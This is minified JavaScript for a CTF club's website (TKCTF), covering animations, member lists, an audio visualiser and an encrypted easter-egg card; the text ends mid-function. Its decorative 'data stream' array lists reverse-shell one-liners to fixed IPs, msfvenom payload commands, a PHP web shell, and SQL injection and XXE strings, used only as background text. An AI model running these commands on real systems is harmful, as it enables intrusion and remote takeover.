var TKCTF=(()=>{var $=(e,t,o)=>new Promise((n,a)=>{var s=r=>{try{c(o.next(r))}catch(l){a(l)}},i=r=>{try{c(o.throw(r))}catch(l){a(l)}},c=r=>r.done?n(r.value):Promise.resolve(r.value).then(s,i);c((o=o.apply(e,t)).next())});var H="medium",f=!1;function Le(e){H!==e&&(H=e,document.querySelectorAll(".performance-btn").forEach(t=>{t.classList.remove("active")}),document.querySelector(`[data-level="${e}"]`).classList.add("active"),localStorage.setItem("tkctf-performance-level",e),Me())}function Me(){let e=document.getElementById("dataStreams");e&&(e.innerHTML="",ge()),ie();let t=b();[".content-section",".president-item",".president-members",".role-tag",".code-name"].forEach(n=>{document.querySelectorAll(n).forEach(s=>{s.classList.remove("fade-in-visible"),!t.enableFadeAnimations&&(n===".role-tag"||n===".code-name")?(s.style.opacity="1",s.style.transform="translateY(0)",s.style.transition="none"):(s.style.opacity="0",s.style.transform="translateY(30px)",s.style.transition="opacity 0.6s ease, transform 0.6s ease")})}),setTimeout(()=>{ae()},100)}function Ie(){let e=document.getElementById("performanceToggle"),t=document.querySelector(".collapse-icon");if(!R){let o=e.offsetHeight;o>0&&(ee=o)}R=!R,R?(e.classList.add("collapsed"),t.textContent="<",ee>0&&(e.style.height=ee+"px")):(e.classList.remove("collapsed"),t.textContent=">",e.style.height=""),localStorage.setItem("tkctf-performance-toggle-collapsed",R),ke()}function ke(){X()}function X(){let e=document.querySelector("nav"),t=document.getElementById("performanceToggle");if(!e||!t)return;let o=e.getBoundingClientRect(),n=t.getBoundingClientRect(),s=window.innerWidth>=768?20:10;if(o.top<=25){let c=s+n.height,r=o.top,l=c>=r,d=!(o.right<n.left||o.left>n.right);if(l&&d){if(!F){let p=r+o.height+10;t.style.top=p+"px",F=!0}}else F&&(t.style.top=s+"px",F=!1)}else F&&(t.style.top=s+"px",F=!1)}function b(){return{low:{dataStreamCount:f?4:12,binaryStreamCount:f?Math.floor(1.6):8,spectrumBarCount:Math.floor(f?window.innerWidth/24:window.innerWidth/12),spectrumBarWidth:f?16:8,enableBinaryDigits:!1,enableSpectrumHighlight:!1,enableDataStreamGlitch:!1,enableLogoBeats:!1,enableFadeAnimations:!1,particleCount:f?12:18,dataStreamDrift:f?30:100,typewriterWaitTime:4500},medium:{dataStreamCount:f?8:16,binaryStreamCount:f?Math.floor(4):8,spectrumBarCount:Math.floor(f?window.innerWidth/24:window.innerWidth/12),spectrumBarWidth:f?16:8,enableBinaryDigits:!0,enableSpectrumHighlight:!0,enableDataStreamGlitch:!0,enableLogoBeats:!0,enableFadeAnimations:!0,particleCount:f?15:20,dataStreamDrift:f?50:100,typewriterWaitTime:3500},high:{dataStreamCount:f?12:20,binaryStreamCount:8,spectrumBarCount:Math.floor(f?window.innerWidth/18:window.innerWidth/12),spectrumBarWidth:f?12:8,enableBinaryDigits:!0,enableSpectrumHighlight:!0,enableDataStreamGlitch:!0,enableLogoBeats:!0,enableFadeAnimations:!0,particleCount:f?18:20,dataStreamDrift:100,typewriterWaitTime:2500}}[H]}function ge(){let e=document.getElementById("dataStreams"),t=b(),o=t.dataStreamCount,n=["0x4D5A90000300000004000000FFFF0000B800000000000000400000","GET /api/security HTTP/1.1",`POST /login HTTP/1.1
Content-Type: application/json`,`Connection: keep-alive
Authorization: Bearer eyJ0eXAi`,"SELECT * FROM users WHERE id = ?","UNION SELECT username,password FROM admin","INSERT INTO logs (timestamp, event) VALUES","nmap -sS -O target.com","hydra -l admin -P passwords.txt ssh://target","john --wordlist=rockyou.txt hash.txt",'sqlmap -u "http://target.com/login.php"',"python3 exploit.py --target 192.168.1.100","U2VjcmV0OiBCR00gT04gKyBkaXYgRm9vdGVyIOKGk+KGk+KGkw==","use exploit/multi/handler","set PAYLOAD windows/x64/meterpreter/reverse_tcp","msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f elf -o reverse.elf","ncat.exe%20112.34.55.67%204444%20-e%20cmd","/bin/bash -i >& /dev/tcp/112.34.55.67/4444 0>&1","nc -lvnp 4444",'msfconsole -q -x "use exploit/multi/handler"','curl -X POST -d "username=admin&password=123"','wireshark -i eth0 -f "tcp port 80"',"tcpdump -i any -w capture.pcap","openssl s_client -connect target.com:443","ssh-keygen -t rsa -b 4096","gpg --gen-key --default-new-key-algo rsa4096","hashcat -a 0 -m 1000 hashes.txt wordlist.txt","aircrack-ng -w wordlist.txt capture.cap","dirb http://target.com/ /usr/share/wordlists/","gobuster dir -u http://target.com -w wordlist.txt",'<script>alert("XSS")<\/script>',"../../../../etc/passwd","{{7*7}}[[7*7]]",'<?php system($_GET["cmd"]); ?>','eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7"))',"LDAP injection: *)(&(objectClass=*)",'XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',"' OR '1'='1' --","'; DROP TABLE users; --","' UNION SELECT NULL,username,password FROM admin --","1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --","masscan -p1-65535 --rate=1000 192.168.1.0/24","nmap -sV -sC -A target.com","nmap --script vuln target.com","nikto -h http://target.com","whatweb http://target.com","fierce -dns target.com","dnsrecon -d target.com -t brt","sublist3r -d target.com","medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh","patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt","crackmapexec smb 192.168.1.0/24 -u admin -p password123","wpscan --url http://target.com --enumerate u,p","use auxiliary/scanner/smb/smb_version","use exploit/windows/smb/ms17_010_eternalblue","set RHOSTS 192.168.1.100","exploit -j","search cve:2021-44228","use post/windows/gather/hashdump","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.87 LPORT=443 -f exe -o payload.exe","msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f raw > shell.php","msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f war > shell.war",`python -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.10.0.87',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"`,`php -r "$sock=fsockopen('10.10.0.87',4444);exec('/bin/sh -i <&3 >&3 2>&3');"`,`ruby -rsocket -e"f=TCPSocket.open('10.10.0.87',4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)"`,`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.0.87',4444);"`,"ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//","arpspoof -i eth0 -t 192.168.1.100 192.168.1.1","responder -I eth0 -rdw","mitmdump -s script.py","hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a","john --format=NT hashes.txt","ophcrack -t tables/ -f hashes.txt","fcrackzip -D -p rockyou.txt archive.zip","airodump-ng wlan0mon","aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon","aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap","wifite --kill","kismet -c wlan0","ffuf -w wordlist.txt -u http://target.com/FUZZ","dirsearch -u http://target.com -e php,html,js","feroxbuster -u http://target.com -w wordlist.txt","wfuzz -w wordlist.txt http://target.com/FUZZ",'sqlmap -u "http://target.com/page.php?id=1" --dbs','sqlmap -u "http://target.com/page.php?id=1" --dump-all','sqlmap -u "http://target.com/page.php?id=1" --os-shell',"NoSQLMap -t mongodb://target.com:27017","setoolkit","gophish server --listen 0.0.0.0:3333","beef-xss","shellphish","mimikatz # sekurlsa::logonpasswords","bloodhound-python -d domain.local -u user -p pass -gc dc.domain.local -c all","winpeas.exe","linpeas.sh","privilege escalation: sudo -l","find / -perm -u=s -type f 2>/dev/null",'tshark -i eth0 -f "tcp port 80" -w capture.pcap',"tcpflow -i eth0 -c","dsniff -i eth0","urlsnarf -i eth0","volatility -f memory.dump imageinfo","autopsy case.db",'grep -r "error" /var/log/',"logstash -f config.conf","steghide embed -cf image.jpg -ef secret.txt","binwalk -e firmware.bin","strings binary | grep -i password","hexdump -C file.bin | head -20","burpsuite --config-file=config.json","postman collection run security-tests.json","owasp-zap-cli quick-scan --self-contained http://target.com",'curl -X GET "http://target.com/api/users" -H "Authorization: Bearer token123"'];for(let a=0;a<o;a++){let s=document.createElement("div");s.className="data-stream";let i=n[Math.floor(Math.random()*n.length)];s.textContent=i;let c=Math.random()*window.innerWidth,r=(Math.random()-.5)*t.dataStreamDrift,l=Math.random()*8;s.style.left=c+"px",s.style.setProperty("--drift-x",r+"px"),s.style.animationDelay=`-${l}s`,e.appendChild(s)}Ae()}function Ae(){let e=document.getElementById("dataStreams"),o=b().binaryStreamCount;for(let n=0;n<o;n++){let a=document.createElement("div");a.className="binary-stream";let s="";for(let r=0;r<80;r++)s+=Math.random()>.5?"1":"0",r%8===7&&(s+=" ");a.textContent=s;let i=Math.random()*window.innerHeight,c=Math.random()*20;a.style.top=i+"px",a.style.animationDelay=`-${c}s`,e.appendChild(a)}}function He(e){let t=document.querySelector(e);if(t){let o=document.querySelector("nav"),n=t.querySelector("h2"),a=o?o.offsetHeight:0,s=n?n.offsetHeight:0,i=a+s,r=t.getBoundingClientRect().top+window.pageYOffset-i;window.scrollTo({top:r,behavior:"smooth"})}}document.querySelectorAll('nav a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault(),He(this.getAttribute("href"))})});function ae(){let e=window.innerHeight,t=e*.7,n=b().enableFadeAnimations?[".president-item",".contact-item","#friendsList",".president-members",".member-row",".role-tag",".code-name"]:[".president-item",".president-members","#friendsList"];document.querySelectorAll(".content-section").forEach((s,i)=>{if(s.classList.contains("fade-in-visible"))return;let c=s.getBoundingClientRect().top,r=s.getBoundingClientRect().height,l=e*.85,d=r*.05;if(c<l-d&&c>-r){let p=i*100;setTimeout(()=>{s.style.opacity="1",s.style.transform="translateY(0)",s.classList.add("fade-in-visible"),s.style.transition="opacity 1.5s ease, transform 1.5s ease"},p)}}),n.forEach(s=>{document.querySelectorAll(s).forEach((c,r)=>{if(c.classList.contains("fade-in-visible"))return;let l=c.getBoundingClientRect().top,d=c.getBoundingClientRect().height,m=d*.05;if(l<e-m&&l>-d){let u=r*50;setTimeout(()=>{c.style.opacity="1",c.style.transform="translateY(0)",c.classList.add("fade-in-visible"),c.id},u)}})})}function De(){let e=document.getElementById("backToTop"),t=document.querySelector("footer");if(!e)return;let o=window.pageYOffset||document.documentElement.scrollTop,n=t?t.getBoundingClientRect().top+window.pageYOffset:1/0,a=window.innerHeight,s=window.innerWidth<768,i=s?20:30,c=s?45:50;if(o>200)if(e.classList.add("show"),o+a-c-i+c+10>n){let l=o+a-n+10;e.style.bottom=l+"px"}else e.style.bottom=i+"px";else e.classList.remove("show")}function Fe(){P(),window.scrollTo({top:0,behavior:"smooth"})}function Re(){return $(this,null,function*(){try{let t=yield(yield fetch("./data/members.json")).json();Oe(t.presidents),Pe(t.members)}catch(e){console.error("\u52A0\u8F7D\u6210\u5458\u6570\u636E\u5931\u8D25:",e)}})}function Ne(){return $(this,null,function*(){try{let t=yield(yield fetch("./data/friends.json")).json();qe(t.friends)}catch(e){console.error("\u52A0\u8F7D\u53CB\u94FE\u6570\u636E\u5931\u8D25:",e)}})}function Oe(e){let t=document.getElementById("presidentsList");if(!t)return;let o=Object.keys(e).sort((n,a)=>n-a);t.innerHTML="",o.forEach((n,a)=>{let s=e[n];if(!s)return;let i=document.createElement("div");i.className="president-item",i.style.opacity="0",i.style.transform="translateY(30px)",i.style.transition="opacity 0.6s ease, transform 0.6s ease",i.style.animationDelay=`${a*300}ms`;let c=document.createElement("div");c.className="president-year",c.textContent=`${n}\u5C4A\u625B\u628A\u5B50`,i.appendChild(c);let r=document.createElement("div");r.className="president-names",i.appendChild(r);let l=document.createElement("div");if(l.className="achievements",l.innerHTML=s.achievements||"\u4E3B\u8981\u6210\u5C31\uFF1A\u6682\u65E0\u8BB0\u5F55",i.appendChild(l),!s.members||s.members.length===0){let d=document.createElement("span");d.className="unknown-member",d.innerHTML='> Error: Permission denied\uFF08\u7EC6\u8282\u6709\u5F85\u8003\u8BC1\uFF09<span class="blinking-cursor">_</span>',r.appendChild(d)}else{let d=document.createElement("div");d.className="president-members",d.style.opacity="0",d.style.transform="translateY(30px)",d.style.transition="opacity 0.6s ease, transform 0.6s ease",s.members.forEach((m,p)=>{let u=document.createElement("div");u.className="member-row",u.style.animationDelay=`${p*.1}s`,u.style.opacity="0",u.style.transform="translateY(30px)",u.style.transition="opacity 0.6s ease, transform 0.6s ease";let w=document.createElement("span");w.className="member-name",w.textContent=m.name,u.appendChild(w),m.roles.forEach(q=>{let S=document.createElement("span"),Q;U(q)?Q=Ye(q):Q=j(q),S.className=`role-tag ${Q}`,S.textContent=q,b().enableFadeAnimations?(S.style.opacity="0",S.style.transform="translateY(30px)",S.style.transition="opacity 0.6s ease, transform 0.6s ease"):(S.style.opacity="1",S.style.transform="translateY(0)",S.style.transition="none"),Ge(m.roles)&&!U(q)&&$e(S,m.roles),u.appendChild(S)});let g=document.createElement("span");!m.codeName||m.codeName.trim()===""?(g.className="code-name null",g.textContent="Error: code-name not found"):(g.className="code-name",We(g,m.codeName)),b().enableFadeAnimations?(g.style.opacity="0",g.style.transform="translateY(30px)",g.style.transition="opacity 0.6s ease, transform 0.6s ease"):(g.style.opacity="1",g.style.transform="translateY(0)",g.style.transition="none"),u.appendChild(g),d.appendChild(u)}),r.appendChild(d)}t.appendChild(i)})}function Pe(e){let t=document.getElementById("membersList");if(!t)return;let o=Object.keys(e).sort((n,a)=>a-n);t.innerHTML="",o.forEach((n,a)=>{let s=e[n];if(!s)return;let i=document.createElement("div");i.className="member-group";let c=document.createElement("div");c.className="member-year",c.textContent=`${n}\u5C4A`,i.appendChild(c);let r=document.createElement("div");r.className="member-list",s.length===0?r.textContent="\uFF08\u5F85\u8865\u5145\uFF09":r.textContent=s.join("\u3001"),i.appendChild(r),t.appendChild(i)})}function qe(e){let t=document.getElementById("friendsList");if(!t)return;let o=e.map(n=>`<a href="${n.url}" target="_blank">${n.name}</a>`);t.innerHTML=`<p>${o.join("\u3001")}</p>`,t.style.opacity="0",t.style.transform="translateY(30px)",t.style.transition="opacity 0.6s ease, transform 0.6s ease"}function We(e,t){let o=t.includes("/")?t.split("/"):[t],n=0,a=!0,s="",c=b().typewriterWaitTime;function r(){let l=o[n].trim();a?s.length<l.length?(s=l.substring(0,s.length+1),e.textContent=s,setTimeout(r,100+Math.random()*100)):setTimeout(()=>{a=!1,r()},c):s.length>0?(s=s.substring(0,s.length-1),e.textContent=s,setTimeout(r,50)):(n=(n+1)%o.length,a=!0,setTimeout(r,200))}r()}function U(e){let t=e.toLowerCase();return t.includes("\u7814\u53D1\u603B\u76D1")||t.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")}function j(e){let t=e.toLowerCase();return t.includes("\u6280\u672F")||t.includes("\u653B\u9632")?"tech":t.includes("\u884C\u653F\u8FD0\u8425")?"admin":t.includes("\u7ADE\u8D5B")?"competition":t.includes("\u5BA3\u4F20")?"promotion":"default"}function Ye(e){let t=e.toLowerCase();return t.includes("\u7814\u53D1\u603B\u76D1")?"director":t.includes("\u793E\u56E2\u65B0\u664B\u6307\u5BFC\u8001\u5E08")?"teacher":"default"}function Ge(e){let t=e.filter(n=>!U(n)),o=new Set;return t.forEach(n=>{if(n.includes("/"))n.split("/").forEach(s=>{let i=j(s.trim());o.add(i)});else{let a=j(n);o.add(a)}}),o.size>1}function je(e){let t={tech:"#4a36ff",admin:"#11ffff",competition:"#ffbe32",promotion:"#ff9ff3",default:"#39b8eb"},o=new Set;return e.filter(a=>!U(a)).forEach(a=>{if(a.includes("/"))a.split("/").forEach(i=>{let c=j(i.trim());o.add(t[c])});else{let s=j(a);o.add(t[s])}}),Array.from(o)}function $e(e,t){let o=je(t);if(o.length<=1)return;let n=o.map((a,s)=>{let i=s/(o.length-1)*100;return`${a} ${i}%`}).join(", ");e.style.background=`linear-gradient(135deg, ${n})`,e.style.border="1px solid rgba(255, 255, 255, 0.4)",e.style.boxShadow="0 0 20px rgba(255, 255, 255, 0.5)"}document.addEventListener("DOMContentLoaded",function(){f=window.innerWidth<768,ne=window.pageYOffset||document.documentElement.scrollTop,ge(),ie();let e=b();[".content-section",".president-item",".president-members",".role-tag",".code-name"].forEach(m=>{document.querySelectorAll(m).forEach(u=>{!e.enableFadeAnimations&&(m===".role-tag"||m===".code-name")?(u.style.opacity="1",u.style.transform="translateY(0)",u.style.transition="none"):(u.style.opacity="0",u.style.transform="translateY(30px)",u.style.transition="opacity 0.6s ease, transform 0.6s ease")})}),ae(),Re(),Ne();let o=document.querySelector(".about-title");o&&setTimeout(()=>{o.classList.add("loaded")},100);let n=document.getElementById("backToTop");n&&n.addEventListener("click",Fe);let a=document.getElementById("logoContainer"),s=document.getElementById("bgmAudio");if(a&&s&&(rt(),ct(),a.addEventListener("click",gt),s.addEventListener("ended",yt),O("initial"),f)){let m=document.getElementById("logo");m&&(m.style.transform="")}s&&(s.volume=1,s.loop=!0);let c="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,r=localStorage.getItem("tkctf-performance-level");r&&["low","medium","high"].includes(r)&&(H=r,document.querySelectorAll(".performance-btn").forEach(m=>{m.classList.remove("active")}),document.querySelector(`[data-level="${r}"]`).classList.add("active")),document.querySelectorAll(".performance-btn").forEach(m=>{m.addEventListener("click",()=>{let p=m.getAttribute("data-level");Le(p)})}),localStorage.getItem("tkctf-performance-toggle-collapsed")==="true"&&(R=!0,document.getElementById("performanceToggle").classList.add("collapsed"),document.querySelector(".collapse-icon").textContent="<");let d=document.getElementById("performanceToggleCollapse");d&&d.addEventListener("click",Ie),setTimeout(()=>{X()},1e3),setInterval(()=>{X()},500)});var Ve=0;var D=!1,T=0,ye=1,Z=!1,J=!1,ne=0,W=0,ce=0,R=!1,ee=0,F=!1,le=0,ze=2e3;function _e(){let e=document.getElementById("mainFooter");if(!e||D)return;let t=document.getElementById("bgmAudio");if(!t||t.paused)return;let o=window.pageYOffset||document.documentElement.scrollTop,n=e.offsetTop,a=window.innerHeight,s=document.documentElement.scrollHeight,i=o+a>=s-1,c=o+a>=n+e.offsetHeight;i&&c&&Ue()}function we(){let e=document.getElementById("mainFooter");if(!e)return!1;let t=window.pageYOffset||document.documentElement.scrollTop,o=e.offsetTop,n=window.innerHeight,a=document.documentElement.scrollHeight;if("ontouchstart"in window||navigator.maxTouchPoints>0){let i=t+n>=a-20,c=t+n>=o-50;return i&&c}else{let i=t+n>=a-1,c=t+n>=o+e.offsetHeight;return i&&c}}function Ke(e){let t=document.getElementById("mainFooter");if(!t)return;let o=document.getElementById("bgmAudio");if(!o||o.paused)return;let n=window.pageYOffset||document.documentElement.scrollTop,a=t.offsetTop,s=window.innerHeight,i=document.documentElement.scrollHeight,c=n+s>=i-1,r=n+s>=a+t.offsetHeight;if(c&&r){let l=Date.now();if(e.deltaY>0){if(!D){let d=Math.abs(e.deltaY),m=1+Math.min(2,d/150);W+=d*m;let p=250,u=3200;if(l-ce<p){if(W>=u){e.preventDefault();let w=Math.min(3,Math.max(1,Math.ceil(W/1200)));for(let g=0;g<w;g++)be(0);W=0}}else W=d*m;ce=l}}else e.deltaY<0&&(D?(e.preventDefault(),ve()):T>0&&(e.preventDefault(),P()))}}function Xe(e){let t=document.getElementById("particleContainer");if(!t)return;let o=Math.min(5+e*2,30);for(let n=0;n<o;n++){let a=document.createElement("div");a.className="particle",a.style.left=Math.random()*100+"%",a.style.animationDelay=Math.random()*2+"s",a.style.animationDuration=2+Math.random()*2+"s";let s=2+e*.5;a.style.width=s+"px",a.style.height=s+"px";let i=.5+e*.05;a.style.boxShadow=`0 0 ${10+e}px #00e4ff, 0 0 ${20+e*2}px #00e4ff, 0 0 ${30+e*3}px #00e4ff`,t.appendChild(a),setTimeout(()=>{a.parentNode&&a.parentNode.removeChild(a)},3e3)}}function Ue(){Z||(Z=!0,Xe(1),setTimeout(()=>{Z=!1},100))}function be(e){if(!document.getElementById("mainFooter"))return;J&&(T=0,J=!1),T++;let n="ontouchstart"in window||navigator.maxTouchPoints>0?20:150;T>=n?Ze():T/n>=.01&&Je()}function P(){let e=document.getElementById("mainFooter");if(!e)return;ye=1,e.style.borderTopWidth="1px",T=0,J=!0,document.querySelectorAll(".persistent-glow").forEach(n=>n.remove());let o=document.getElementById("dataStreams");o&&(o.style.transition="opacity 1s ease-in",o.style.opacity="1")}function Je(){let e=document.getElementById("persistentGlow");if(e){Qe(e);return}let t=document.createElement("div");t.id="persistentGlow",t.className="persistent-glow";let o=window.innerWidth<768,a="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,s=Math.min(T/a,1),i=o?15:20,r=i+(135-i)*s,l=o?.4:.6,m=l+(.9-l)*s;if(t.style.cssText=`
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        height: ${r}px;
        background: linear-gradient(to top, rgba(0, 228, 255, ${m}), transparent);
        z-index: 1000;
        will-change: opacity, transform;
        animation: persistentGlow 2s ease-in-out infinite;
        pointer-events: none;
    `,document.body.appendChild(t),o){let p=document.getElementById("dataStreams");p&&(p.style.transition="opacity 1s ease-out",p.style.opacity="0")}}function Qe(e){let t=window.innerWidth<768,n="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,a=Math.min(T/n,1),s=t?15:20,c=s+(135-s)*a,r=t?.4:.6,d=r+(.9-r)*a;e.style.height=`${c}px`,e.style.background=`linear-gradient(to top, rgba(0, 228, 255, ${d}), transparent)`}function Ze(){D=!0;let e=document.getElementById("easterEgg"),t=document.getElementById("mainFooter");if(!e)return;t&&(t.style.display="none");let o=document.getElementById("persistentGlow");o&&(o.style.display="none");let n=document.getElementById("dataStreams");n&&(n.style.transition="opacity 1s ease-in",n.style.opacity="1"),ot(),e.classList.add("show"),e.scrollIntoView({behavior:"smooth"}),bt()}function et(){let e=["IUAj","S2V5","U2VjcmV0","MjAyNQ==","Q1RG","VEs="],t=Object.assign({},{"!":"A","@":"B","#":"C",T:"D",K:"E",C:"F",F:"G",2:"H",0:"I",5:"J",S:"K",e:"L",c:"M",r:"N",t:"O"},{K:"P",e:"Q",y:"R","!":"S","@":"T"}),o=[];for(let i of e)o.push(atob(i));let n=o.join(""),a={};for(let[i,c]of Object.entries(t))a[c]=i;let s="";for(let i of n)s+=a[i]||i;return s}function tt(e){try{let t=et(),n=CryptoJS.AES.decrypt(e,t).toString(CryptoJS.enc.Utf8);if(!n)throw new Error("\u89E3\u5BC6\u5931\u8D25\u6216\u5BC6\u94A5\u9519\u8BEF");return n}catch(t){throw console.error("\u89E3\u5BC6\u5931\u8D25:",t),t}}function ot(){return $(this,null,function*(){let e=document.getElementById("cardContent");if(e)try{let t=yield fetch("./data/Card.encrypted");if(!t.ok)throw new Error("Failed to load encrypted card content");let o=yield t.text(),n=tt(o);e.innerHTML=n,de()}catch(t){console.error("\u52A0\u8F7D\u6216\u89E3\u5BC6\u5361\u7247\u5185\u5BB9\u5931\u8D25:",t),e.innerHTML='<div class="card-container" id="cardContainer"><div class="card" id="card"><div class="card-front"><img src="./img/TKCTF512.svg" alt="TKCTF Logo" class="card-logo"></div><div class="card-back"><div class="card-content"><h4>\u5173\u4E8E\u672C\u7F51\u7AD9</h4><p>\u5185\u5BB9\u52A0\u8F7D\u5931\u8D25</p></div></div></div></div>',de()}})}function ve(){D=!1,Ve=0,T=0,ye=1,J=!1;let t="ontouchstart"in window||navigator.maxTouchPoints>0?20:150,o=document.getElementById("easterEgg"),n=document.getElementById("mainFooter");if(!o)return;o.classList.remove("show");let a=document.getElementById("cardContent");a&&(a.innerHTML=""),Be();let s=document.getElementById("persistentGlow");s&&s.remove();let i=document.getElementById("dataStreams");i&&(i.style.transition="opacity 1s ease-in",i.style.opacity="1"),n&&(n.style.display="",n.style.borderTopWidth="1px"),n&&n.scrollIntoView({behavior:"smooth"})}function de(){let e=document.getElementById("card");e&&e.addEventListener("click",function(){e.classList.contains("flipped")?e.classList.remove("flipped"):e.classList.add("flipped")})}window.addEventListener("scroll",()=>{let e=window.pageYOffset||document.documentElement.scrollTop;e<ne-1&&T>0&&P(),ne=e,De(),ae(),_e(),nt()});function nt(){if(!document.getElementById("mainFooter")||D)return;let t=document.getElementById("bgmAudio");!t||t.paused||we()&&wt()}window.addEventListener("wheel",Ke,{passive:!1});var Y=0,G=0,Ee=0,Te=0,Ce=!1;window.addEventListener("touchstart",function(e){Y=e.touches[0].clientY,Ee=Date.now(),Ce=!1},{passive:!0});window.addEventListener("touchmove",function(e){Ce=!0},{passive:!0});window.addEventListener("touchend",function(e){if(G=e.changedTouches[0].clientY,Te=Date.now(),D){Y<G&&ve();return}let t=document.getElementById("bgmAudio");!t||t.paused||!document.getElementById("mainFooter")||setTimeout(()=>{st()},100)},{passive:!0});function st(){if(!document.getElementById("mainFooter"))return;let t=Math.abs(G-Y),o=Te-Ee;if(Y<G&&t>5&&o<2e3)T>0&&P();else if(we()){let n=window.innerHeight*.45;Y>G&&t>n&&o<500&&be(0)}}var C=!1,x=null,y=null,v=null,L=[];var me=0,M=null,_=null,I=!1,h=null,ue=null,B=null,A=!1,te=0,oe=0,V=0,z=0,fe=0,N=[],k=!1;function at(){try{x=new(window.AudioContext||window.webkitAudioContext);let e=document.getElementById("bgmAudio"),t=x.createMediaElementSource(e);y=x.createAnalyser(),y.fftSize=2048,y.smoothingTimeConstant=.8;let o=y.frequencyBinCount;return v=new Uint8Array(o),t.connect(y),y.connect(x.destination),it(),!0}catch(e){return!1}}function it(){if(!window.Worker){console.warn("Web Worker not supported, falling back to main thread"),I=!1;return}try{let e=(window.location.hostname==="localhost"||window.location.hostname==="127.0.0.1","./src/spectrum-worker.min.js");M=new Worker(e),I=!0,M.onmessage=function(t){let{type:o,data:n}=t.data;switch(o){case"initComplete":M.postMessage({type:"config",data:{fftSize:y.fftSize,sampleRate:x.sampleRate,beatThreshold:188,beatCooldown:25,heavyBeatCooldown:120}});break;case"processedSpectrumData":_=n;break;case"error":console.error("Spectrum worker error:",n);break;case"workerStopped":break}},M.onerror=function(t){console.error("Spectrum worker error:",t),I=!1},M.postMessage({type:"init",data:{fftSize:y.fftSize,sampleRate:x.sampleRate}})}catch(e){console.error("Failed to create spectrum worker:",e),I=!1}}function rt(){let e=document.getElementById("logo");fetch("./img/TKCTF512.svg").then(t=>t.text()).then(t=>{if(e.innerHTML=t,h=e.querySelector("svg"),h){h.id="logoSvg",h.style.width="100%",h.style.height="100%";let o=h.viewBox.baseVal,n=o.width||1e3;ue={T0:h.querySelector(".T0"),K:h.querySelector(".K"),C:h.querySelector(".C"),T1:h.querySelector(".T1"),F:h.querySelector(".F")};let a=h.querySelector("defs");a||(a=document.createElementNS("http://www.w3.org/2000/svg","defs"),h.insertBefore(a,h.firstChild));let s=document.createElementNS("http://www.w3.org/2000/svg","clipPath");s.id="progressClip",B=document.createElementNS("http://www.w3.org/2000/svg","rect"),B.setAttribute("x","0"),B.setAttribute("y","0"),B.setAttribute("width","0"),B.setAttribute("height",o.height||1e3),s.appendChild(B),a.appendChild(s);let i=document.createElementNS("http://www.w3.org/2000/svg","g");i.id="progressGroup",i.setAttribute("clip-path","url(#progressClip)"),Object.values(ue).forEach(c=>{if(c){c.style.fill="#010101";let r=c.cloneNode(!0);r.style.fill="#00a2ff",r.style.filter="drop-shadow(0 0 8px rgba(0, 162, 255, 0.8))",i.appendChild(r)}}),h.appendChild(i)}}).catch(t=>console.error("\u52A0\u8F7DSVG\u5931\u8D25:",t))}function ct(){let e=document.getElementById("logoContainer");if(f)return;e.addEventListener("mousemove",o=>{let n=e.getBoundingClientRect(),a=n.left+n.width/2,s=n.top+n.height/2;te=(o.clientX-a)/10,oe=(o.clientY-s)/10}),e.addEventListener("mouseleave",()=>{te=0,oe=0});function t(){if(V+=(te-V)*.15,z+=(oe-z)*.15,!A&&Math.abs(V)>.1||Math.abs(z)>.1){let o=document.getElementById("logo");(o.style.transform||"").includes("scale")||(o.style.transform=`translate(${V}px, ${z}px)`)}requestAnimationFrame(t)}t()}function se(e){if(!h)return;let t=document.getElementById("logoContainer"),o=document.createElement("div");o.className="trail-particle";let n=h.cloneNode(!0);n.style.width="100%",n.style.height="100%",n.style.transform=`rotate(${e}deg)`,n.style.filter="drop-shadow(0 0 20px rgba(0, 255, 255, 0.9)) brightness(1.3)",o.appendChild(n),t.appendChild(o),setTimeout(()=>{o.style.opacity="0.6",o.style.transition="opacity 0.1s ease-out"},10),setTimeout(()=>{o.style.opacity="0",o.style.transition="opacity 0.3s ease-out"},100),setTimeout(()=>{o.remove()},400)}function lt(e){let t=document.getElementById("logoContainer"),o=document.createElement("div");o.className="pulse-ring",o.style.width="120px",o.style.height="120px",o.style.border=`${3+e*2}px solid rgba(0, 255, 255, ${.9})`,o.style.boxShadow="0 0 30px rgba(0, 255, 255, 0.8), inset 0 0 30px rgba(0, 162, 255, 0.5)",o.style.animation="beatPulse 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards",t.appendChild(o),setTimeout(()=>o.remove(),800)}function dt(){let e=document.getElementById("logoContainer"),t=document.createElement("div");t.className="wave-ring",t.style.width="120px",t.style.height="120px",e.appendChild(t),setTimeout(()=>t.remove(),320)}function mt(){if(!y||!v||!C)return;y.getByteFrequencyData(v);let e=0,t=0;I&&_?(e=_.spectrumFeatures.totalEnergy,t=_.spectrumFeatures.spectralCentroid):e=v.reduce((i,c)=>i+c)/v.length/255;let n=5+e*12,a=(Math.random()-.5)*(1+e*8);if(!k&&!A){let s=document.getElementById("logo"),i=(Math.random()-.5)*n,c=(Math.random()-.5)*n;s.style.transform=`translate(${i}px, ${c}px) 